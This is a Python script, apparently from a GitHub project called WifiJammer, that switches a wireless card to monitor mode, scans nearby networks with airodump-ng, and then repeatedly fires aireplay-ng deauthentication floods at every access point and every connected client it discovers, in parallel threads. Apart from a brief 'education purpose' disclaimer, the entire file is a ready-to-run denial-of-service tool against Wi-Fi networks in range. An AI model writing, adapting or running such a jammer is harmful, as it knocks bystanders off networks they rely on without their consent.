#Source - https://github.com/PranavGajjar0305/WifiJammer
import os
import subprocess
import time
import threading
import random
import csv

listall=[] #contain every data
listrc=[] #contain bssid and channel #router-channel
listrd=[] #contain bssid and ssid #router-device
listrdc=[] #contain bssid, ssid and channel #router-device-channel
listdeauth=[] #contain bssid, ssid and channel of deauth device
listclassofdeauth=[]
listdeauthbssid=[]
listclassofdeauthbssid=[]
restartscan=1
threadcount=1



def deauthfunc(bssid,essid,ch):
	global inter
	global listdeauth
	temptime=time.time()+10
	while (time.time()<temptime):
		cmdall=["xterm","-e","iwconfig",inter,"channel",ch]
		hometest=subprocess.run(cmdall)
		cmdall=["xterm","-e","aireplay-ng","-0","0","-a",bssid,"-c",essid,inter]
		hometest=subprocess.run(cmdall)
	listdeauth.remove([bssid,essid,ch])
	
def deauthfuncforbssid(bssid,ch):
	global inter
	global listdeauthbssid
	temptime=time.time()+18
	while (time.time()<temptime):
		cmdall=["xterm","-e","iwconfig",inter,"channel",ch]
		hometest=subprocess.run(cmdall)
		cmdall=["xterm","-e","aireplay-ng","-0","0","-a",bssid,inter]
		hometest=subprocess.run(cmdall)
	listdeauthbssid.remove([bssid,ch])


def diff_symmetric(list1,list2):
	out=[]
	for ele in list1:
		if not ele in list2:
			out.append(ele)
	return out

def union(list1,list2):
	out=[]
	for ele in list1:
		out.append(ele)
	for ele in list2:
		if not ele in out:
			out.append(ele)
	return out




def airodumpngall(inter):
	global restartscan
	while(True):
		while(restartscan==1):
			global filename
			i=random.random()
			filename=str(i)
			
			try:
				cmdall=["airodump-ng",inter,"-w",filename,"--write-interval","18","-o","csv"]
				
				subprocess.run(cmdall,timeout=23)
			except subprocess.TimeoutExpired:
				print("Complete of airodump-ng")
			print("Fine")
			restartscan=0


def algopart():
	global output_airodump
	global listall
	global listrc
	global listrd
	global listrdc
	global listdeauth
	global filename
	global restartscan
	global threadcount
	global listclassofdeauth
	global listdeauthbssid
	global listclassofdeauthbssid
	time.sleep(24)
	
	while True:
		while restartscan==0:
			with open(filename+'-01.csv', 'r') as csvfile:
				spamreader = csv.reader(csvfile, delimiter=',')
				for row in spamreader:
					if(row!=[]):
						listall.append(row)
			
			
			for li in range(1,len(listall)): #adding router's bssid and channel
				if(listall[li][0]=="Station MAC"):
					break
				else:
					listintemp=[listall[li][0],listall[li][3].replace(" ","")]
					if(listintemp not in listrc):
						listrc.append([listall[li][0],listall[li][3].replace(" ","")])

			
			
			for li in range(1,len(listall)): #finding line no from where ssid start
				if(listall[li][0]=="Station MAC"):
					linenumofdevice=li+1

			
			
			for li in range(linenumofdevice,len(listall)): #adding router's bssid and device's ssid
				listindtemp=[listall[li][5].replace(" ",""),listall[li][0]]
				#print(listindtemp)
				if(listindtemp not in listrd):
					listrd.append([listall[li][5].replace(" ",""),listall[li][0]])
			
			
			for li in range(0,len(listrd)): #adding router's bssid, ssid and channel
				if(listrd[li][0]!="(notassociated)"):
					tempinf=0
					for lj in range(0,len(listrc)):
						if(listrc[lj][0]==listrd[li][0]):
							tempinf=listrc[lj][1]
							#print(tempinf)
							break
					listinftemp=[listrd[li][0],listrd[li][1],tempinf]
					if(listinftemp not in listrdc):
						listrdc.append([listrd[li][0],listrd[li][1],tempinf])
			print(listrdc)
			print(listrc)
			

			listtempbssid=diff_symmetric(listrc,listdeauthbssid)
			listdeauthbssid=union(listrc,listdeauthbssid)
			listclassofdeauthbssid=[]
			
			for li in range(0,len(listtempbssid)):
				tind=threading.Thread(target=deauthfuncforbssid,args=(listtempbssid[li][0],listtempbssid[li][1]))
				listclassofdeauthbssid.append(tind)
				listclassofdeauthbssid[li].start()
				print("BSSID Thread & Timer Started")
				time.sleep(20)
				print("Timer Closed")

			f=open("outputbssid.csv","w+")
			writer=csv.writer(f)
			writer.writerows(listdeauthbssid)
			f.close()



			listtemp=diff_symmetric(listrdc,listdeauth)
			listdeauth=union(listrdc,listdeauth)
			listclassofdeauth=[]
			
			for li in range(0,len(listtemp)):
				tin=threading.Thread(target=deauthfunc,args=(listtemp[li][0],listtemp[li][1],listtemp[li][2],))
				listclassofdeauth.append(tin)
				listclassofdeauth[li].start()
				print("Thread & Timer Started")
				time.sleep(12)
				print("Timer Closed")

			#--------------------------
			f=open("output.csv","w+")
			writer=csv.writer(f)
			writer.writerows(listdeauth)
			f.close()
			#time.sleep(20)
			os.remove(filename+'-01.csv')
			restartscan=1


#-------------------------------------------------------------

inter="wlan0"
subprocess.run("clear")
f=open("logo","r")
logo=f.read()
print(logo)
print("\n\n[*] This Program is only for education purpose. If you misuse this program then you are responsible for it.\n")
print("[->] Do you agree with our Terms and Conditions?")
agg=input("Press Y for Accept = ")
i=random.random()
filename=str(i)

#print("Log filename = {}".format(filename))
if agg=="Y" or agg=="y" or agg.lower()=="yes":
	print("------ Starting Script------")
	inter=input("Enter Interface Name = ")
	print("[*] Turning on monitor mode of interface {}".format(inter))
	subprocess.call("ifconfig "+inter+" down",shell=True)
	subprocess.call("iwconfig "+inter+" mode monitor",shell=True)
	subprocess.call("ifconfig "+inter+" up",shell=True)
	


	t1=threading.Thread(target=airodumpngall,args=(inter,))
	t2=threading.Thread(target=algopart)

	t1.start()
	t2.start()
	t1.join()
	t2.join()
	print("End---------")
else:
	print(" - - - - - - - - - - - - - - Exit - - - - - - - - - - - - - -")
